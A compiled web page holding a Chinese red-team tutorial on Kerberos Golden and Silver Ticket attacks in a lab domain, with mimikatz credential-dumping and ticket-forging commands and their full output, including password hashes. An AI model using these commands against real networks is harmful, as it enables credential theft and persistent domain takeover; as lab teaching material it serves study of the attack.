import{_ as a,K as s,L as l,M as n,N as e,a5 as v,W as i,F as c}from"./framework-edebdfe1.js";const b={},r=i(`<h1 id="pass-the-ticket" tabindex="-1"><a class="header-anchor" href="#pass-the-ticket" aria-hidden="true">#</a> Pass-The-Ticket</h1><h2 id="golden-ticket" tabindex="-1"><a class="header-anchor" href="#golden-ticket" aria-hidden="true">#</a> Golden Ticket</h2><p>用户的Ticket都是由krbtgt用户的密码Hash来生成的，我们如果拿到了krbtgt的密码Hash，就可以随意伪造Ticket。需要域控权限，通过mimikatz即可生成任意用户任何权限的Ticket，也就是Golden Ticket，作为后门，权限维持。</p><ul><li>域控导出ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz &quot;lsadump::dcsync /domain:deelmind.lab /user:krbtgt&quot;

mimikatz # lsadump::dcsync /domain:deelmind.lab /user:krbtgt
[DC] &#39;deelmind.lab&#39; will be the domain
[DC] &#39;root.deelmind.lab&#39; will be the DC server
[DC] &#39;krbtgt&#39; will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 9/14/2022 11:13:52 AM
Object Security ID   : S-1-5-21-3330634377-1326264276-632209373-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: cd6abf9b42e7868f57f93b552f742b9c
    ntlm- 0: cd6abf9b42e7868f57f93b552f742b9c
    lm  - 0: f1ab4055f6dca0d07e2183869fb6c2ca

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 20e2676c969e45622693cb6511d01f36

* Primary:Kerberos-Newer-Keys *
    Default Salt : DEELMIND.LABkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : fe980d389a9b62613e33d564d3ca48c5021f3160109296cd9bd389c1c830ef77
      aes128_hmac       (4096) : 2914426d164fcfa1c15e72a75af77cee
      des_cbc_md5       (4096) : 7a4cdc6780a25d45

* Primary:Kerberos *
    Default Salt : DEELMIND.LABkrbtgt
    Credentials
      des_cbc_md5       : 7a4cdc6780a25d45

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  af4fe16941bd313bbf2ef149248c639d
    02  5b38bb373faccdc3d50ec687bed0f072
    03  92153413c2eec54c4d38db172017a11f
    04  af4fe16941bd313bbf2ef149248c639d
    05  5b38bb373faccdc3d50ec687bed0f072
    06  1f8cee689ea4946a9936692c077a79d9
    07  af4fe16941bd313bbf2ef149248c639d
    08  a5efbbc949a516e12b0f69d2fda141f9
    09  a5efbbc949a516e12b0f69d2fda141f9
    10  5abb1c7332696c8a51f09109bbe938bb
    11  2a5d76a74663d655e6d473af3f6c165f
    12  a5efbbc949a516e12b0f69d2fda141f9
    13  8d1d6d32034e6c30a6db63ccffe36f3b
    14  2a5d76a74663d655e6d473af3f6c165f
    15  53ee835be5e7b506750e11574342abfd
    16  53ee835be5e7b506750e11574342abfd
    17  f7ea17c32130a6cd61258819d9e5159a
    18  7c15d93df1dde87a13c746c4d8bebbe2
    19  7bc29089fe6ea151a0039e129ca1cdeb
    20  8372a716f91670956c78ca8090771033
    21  570ad2383d538a594f38d10df3574e1e
    22  570ad2383d538a594f38d10df3574e1e
    23  099b387eb5e41ce2066330c22d492ecc
    24  efa161d88c90757635102d71a0649f8c
    25  efa161d88c90757635102d71a0649f8c
    26  036fcd5cb59c947e64002443196366fb
    27  ed634dc7ad2ad97fe21469f428b018b5
    28  dc31f96947e051767177a9297be82e8e
    29  01b87c9ce4f727ce59fafdfb7029991b
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>伪造ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz.exe &quot;kerberos::golden /domain:deelmind.lab /aes256:fe980d389a9b62613e33d564d3ca48c5021f3160109296cd9bd389c1c830ef77 /sid:S-1-5-21-3330634377-1326264276-632209373-502 /krbtgt:cd6abf9b42e7868f57f93b552f742b9c /user:anyone /ticket:golden.kirbi&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>导入ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz &quot;kerberos::ptt golden.kirbi&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>PSExec连接</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>psexec \\\\root.deelmind.lab cmd
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="silver-ticket" tabindex="-1"><a class="header-anchor" href="#silver-ticket" aria-hidden="true">#</a> Silver Ticket</h2>`,12),m={href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962",target:"_blank",rel:"noopener noreferrer"},u=i(`<ul><li>获取服务Hash</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;

Authentication Id : 0 ; 21042923 (00000000:014116eb)
Session           : NewCredentials from 2
User Name         : vagrant
Domain            : DEELMIND
Logon Server      : (null)
Logon Time        : 11/12/2022 3:45:04 PM
SID               : S-1-5-21-3330634377-1326264276-632209373-1000
        msv :
         [00000003] Primary
         * Username : a
         * Domain   : deelmind.lab
         * NTLM     : 186cb09181e2c2ecaac768c47c729904
         * SHA1     : 0a04b971b03da607ce6c455184037b660ca89f78
         * DPAPI    : e098808173220bfe58003e3f0fc33534
        tspkg :
        wdigest :
         * Username : a
         * Domain   : deelmind.lab
         * Password : (null)
        kerberos :
         * Username : a
         * Domain   : deelmind.lab
         * Password : a
        ssp :
        credman :

Authentication Id : 0 ; 708578 (00000000:000acfe2)
Session           : RemoteInteractive from 2
User Name         : vagrant
Domain            : DEELMIND
Logon Server      : ROOT
Logon Time        : 11/7/2022 3:13:44 PM
SID               : S-1-5-21-3330634377-1326264276-632209373-1000
        msv :
         [00000003] Primary
         * Username : vagrant
         * Domain   : DEELMIND
         * NTLM     : e02bc503339d51f71d913c245d35b50b
         * SHA1     : c805f88436bcd9ff534ee86c59ed230437505ecf
         * DPAPI    : 3cfc6375c63f5ba465ab84fdf22d6ffe
        tspkg :
        wdigest :
         * Username : vagrant
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : vagrant
         * Domain   : DEELMIND.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 686352 (00000000:000a7910)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/7/2022 3:13:41 PM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : ROOT$
         * Domain   : deelmind.lab
         * Password : 4a 01 a5 8d 79 04 4f dd 09 a3 42 01 30 f7 21 b8 0d f4 83 54 11 3c b2 48 04 ce 2b 2a 94 d0 64 d9 a4 8e 75 48 57 aa bc 71 e5 c2 f8 09 da 87 40 ab 0e 1a 65 f8 16 5e 1d ca 8d 1d ad 4e 5f df 10 8d 20 1c 90 e7 96 15 a0 3b 65 34 85 37 3b e9 5e f7 58 ab 89 3a 93 00 18 fb 58 14 b2 fa 89 99 71 99 97 fa 1a db 2c 95 55 0b 30 65 41 8c c6 27 b1 2b 04 09 16 42 60 1d 45 e6 21 8a aa 5c d8 a4 77 69 0b 6e eb d5 a3 11 5a 13 ab ed e4 aa 64 dc 39 b8 3e 7b 43 78 45 bf 4e a1 cf 51 62 c2 41 ec 0d 00 81 e8 91 89 4c 28 ab 05 f6 78 c0 db 92 b4 c9 42 98 f9 aa 27 66 f8 f6 78 7f f7 da f9 41 d9 72 70 29 3c 44 03 b1 38 14 5a e6 21 eb f8 2a c5 bd 25 34 dc 9b b8 ec d5 7c 8b f8 47 32 ce c6 ca ac f6 11 ca 91 e6 82 fe fa 6b 6d bd d0 67 43 55 15 2b
        ssp :
        credman :

Authentication Id : 0 ; 42569 (00000000:0000a649)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/7/2022 6:42:04 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : ROOT$
         * Domain   : deelmind.lab
         * Password : 4a 01 a5 8d 79 04 4f dd 09 a3 42 01 30 f7 21 b8 0d f4 83 54 11 3c b2 48 04 ce 2b 2a 94 d0 64 d9 a4 8e 75 48 57 aa bc 71 e5 c2 f8 09 da 87 40 ab 0e 1a 65 f8 16 5e 1d ca 8d 1d ad 4e 5f df 10 8d 20 1c 90 e7 96 15 a0 3b 65 34 85 37 3b e9 5e f7 58 ab 89 3a 93 00 18 fb 58 14 b2 fa 89 99 71 99 97 fa 1a db 2c 95 55 0b 30 65 41 8c c6 27 b1 2b 04 09 16 42 60 1d 45 e6 21 8a aa 5c d8 a4 77 69 0b 6e eb d5 a3 11 5a 13 ab ed e4 aa 64 dc 39 b8 3e 7b 43 78 45 bf 4e a1 cf 51 62 c2 41 ec 0d 00 81 e8 91 89 4c 28 ab 05 f6 78 c0 db 92 b4 c9 42 98 f9 aa 27 66 f8 f6 78 7f f7 da f9 41 d9 72 70 29 3c 44 03 b1 38 14 5a e6 21 eb f8 2a c5 bd 25 34 dc 9b b8 ec d5 7c 8b f8 47 32 ce c6 ca ac f6 11 ca 91 e6 82 fe fa 6b 6d bd d0 67 43 55 15 2b
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ROOT$
Domain            : DEELMIND
Logon Server      : (null)
Logon Time        : 11/7/2022 6:42:02 AM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : root$
         * Domain   : DEELMIND.LAB
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 24350 (00000000:00005f1e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/7/2022 6:42:01 AM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : ROOT$
         * Domain   : deelmind.lab
         * Password : 4a 01 a5 8d 79 04 4f dd 09 a3 42 01 30 f7 21 b8 0d f4 83 54 11 3c b2 48 04 ce 2b 2a 94 d0 64 d9 a4 8e 75 48 57 aa bc 71 e5 c2 f8 09 da 87 40 ab 0e 1a 65 f8 16 5e 1d ca 8d 1d ad 4e 5f df 10 8d 20 1c 90 e7 96 15 a0 3b 65 34 85 37 3b e9 5e f7 58 ab 89 3a 93 00 18 fb 58 14 b2 fa 89 99 71 99 97 fa 1a db 2c 95 55 0b 30 65 41 8c c6 27 b1 2b 04 09 16 42 60 1d 45 e6 21 8a aa 5c d8 a4 77 69 0b 6e eb d5 a3 11 5a 13 ab ed e4 aa 64 dc 39 b8 3e 7b 43 78 45 bf 4e a1 cf 51 62 c2 41 ec 0d 00 81 e8 91 89 4c 28 ab 05 f6 78 c0 db 92 b4 c9 42 98 f9 aa 27 66 f8 f6 78 7f f7 da f9 41 d9 72 70 29 3c 44 03 b1 38 14 5a e6 21 eb f8 2a c5 bd 25 34 dc 9b b8 ec d5 7c 8b f8 47 32 ce c6 ca ac f6 11 ca 91 e6 82 fe fa 6b 6d bd d0 67 43 55 15 2b
        ssp :
        credman :

Authentication Id : 0 ; 24285 (00000000:00005edd)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 11/7/2022 6:42:01 AM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : ROOT$
         * Domain   : deelmind.lab
         * Password : 4a 01 a5 8d 79 04 4f dd 09 a3 42 01 30 f7 21 b8 0d f4 83 54 11 3c b2 48 04 ce 2b 2a 94 d0 64 d9 a4 8e 75 48 57 aa bc 71 e5 c2 f8 09 da 87 40 ab 0e 1a 65 f8 16 5e 1d ca 8d 1d ad 4e 5f df 10 8d 20 1c 90 e7 96 15 a0 3b 65 34 85 37 3b e9 5e f7 58 ab 89 3a 93 00 18 fb 58 14 b2 fa 89 99 71 99 97 fa 1a db 2c 95 55 0b 30 65 41 8c c6 27 b1 2b 04 09 16 42 60 1d 45 e6 21 8a aa 5c d8 a4 77 69 0b 6e eb d5 a3 11 5a 13 ab ed e4 aa 64 dc 39 b8 3e 7b 43 78 45 bf 4e a1 cf 51 62 c2 41 ec 0d 00 81 e8 91 89 4c 28 ab 05 f6 78 c0 db 92 b4 c9 42 98 f9 aa 27 66 f8 f6 78 7f f7 da f9 41 d9 72 70 29 3c 44 03 b1 38 14 5a e6 21 eb f8 2a c5 bd 25 34 dc 9b b8 ec d5 7c 8b f8 47 32 ce c6 ca ac f6 11 ca 91 e6 82 fe fa 6b 6d bd d0 67 43 55 15 2b
        ssp :
        credman :

Authentication Id : 0 ; 21352496 (00000000:0145d030)
Session           : NewCredentials from 2
User Name         : vagrant
Domain            : DEELMIND
Logon Server      : (null)
Logon Time        : 11/12/2022 4:00:12 PM
SID               : S-1-5-21-3330634377-1326264276-632209373-1000
        msv :
         [00000003] Primary
         * Username : aaa
         * Domain   : deelmind.lab
         * NTLM     : e24106942bf38bcf57a6a4b29016eff6
         * SHA1     : d034a94e67370f92465b64938096d26aaeb067ef
         * DPAPI    : ec821fbdcc35887e64922d7ad33f7f63
        tspkg :
        wdigest :
         * Username : aaa
         * Domain   : deelmind.lab
         * Password : (null)
        kerberos :
         * Username : aaa
         * Domain   : deelmind.lab
         * Password : aaa
        ssp :
        credman :

Authentication Id : 0 ; 687101 (00000000:000a7bfd)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 11/7/2022 3:13:41 PM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : ROOT$
         * Domain   : deelmind.lab
         * Password : 4a 01 a5 8d 79 04 4f dd 09 a3 42 01 30 f7 21 b8 0d f4 83 54 11 3c b2 48 04 ce 2b 2a 94 d0 64 d9 a4 8e 75 48 57 aa bc 71 e5 c2 f8 09 da 87 40 ab 0e 1a 65 f8 16 5e 1d ca 8d 1d ad 4e 5f df 10 8d 20 1c 90 e7 96 15 a0 3b 65 34 85 37 3b e9 5e f7 58 ab 89 3a 93 00 18 fb 58 14 b2 fa 89 99 71 99 97 fa 1a db 2c 95 55 0b 30 65 41 8c c6 27 b1 2b 04 09 16 42 60 1d 45 e6 21 8a aa 5c d8 a4 77 69 0b 6e eb d5 a3 11 5a 13 ab ed e4 aa 64 dc 39 b8 3e 7b 43 78 45 bf 4e a1 cf 51 62 c2 41 ec 0d 00 81 e8 91 89 4c 28 ab 05 f6 78 c0 db 92 b4 c9 42 98 f9 aa 27 66 f8 f6 78 7f f7 da f9 41 d9 72 70 29 3c 44 03 b1 38 14 5a e6 21 eb f8 2a c5 bd 25 34 dc 9b b8 ec d5 7c 8b f8 47 32 ce c6 ca ac f6 11 ca 91 e6 82 fe fa 6b 6d bd d0 67 43 55 15 2b
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 11/7/2022 6:42:05 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 22168 (00000000:00005698)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 11/7/2022 6:41:55 AM
SID               :
        msv :
         [00000003] Primary
         * Username : ROOT$
         * Domain   : DEELMIND
         * NTLM     : d159b95bb97d49a765e68041b1ce333e
         * SHA1     : 8115a8a178cd0007a772ace9312f797d454051ba
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : ROOT$
Domain            : DEELMIND
Logon Server      : (null)
Logon Time        : 11/7/2022 6:41:55 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : ROOT$
         * Domain   : DEELMIND
         * Password : (null)
        kerberos :
         * Username : root$
         * Domain   : DEELMIND.LAB
         * Password : (null)
        ssp :
        credman :
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>伪造Ticket</li></ul><div class="language-JS line-numbers-mode" data-ext="JS"><pre class="language-JS"><code>mimikatz &quot;kerberos::golden /domain:deelmind.lab /sid:S-1-5-21-3330634377-1326264276-632209373 /target:deelmind.lab /service:cifs /rc4:e02bc503339d51f71d913c245d35b50b /user:anyone /ptt&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,4);function o(f,t){const d=c("ExternalLinkIcon");return s(),l("div",null,[r,n("p",null,[e("服务的Ticket是使用服务的Hash进行加密的，通常为计算机账户Hash加密，就可以给我们自己签发任意用户的TGS票据（service ticket），这个票据也被称为白银票据，可以跳过KDC认证直接去访问指定的服务，但是只能访问特定服务。伪造的白银票据没有带有有效KDC签名的PAC（"),n("a",m,[e("Privilege Attribute Certificate"),v(d)]),e("），如果将目标主机配置为验证KDCPAC签名，则银票将不起作用。")]),u])}const g=a(b,[["render",o],["__file","ptt.html.vue"]]);export{g as default};
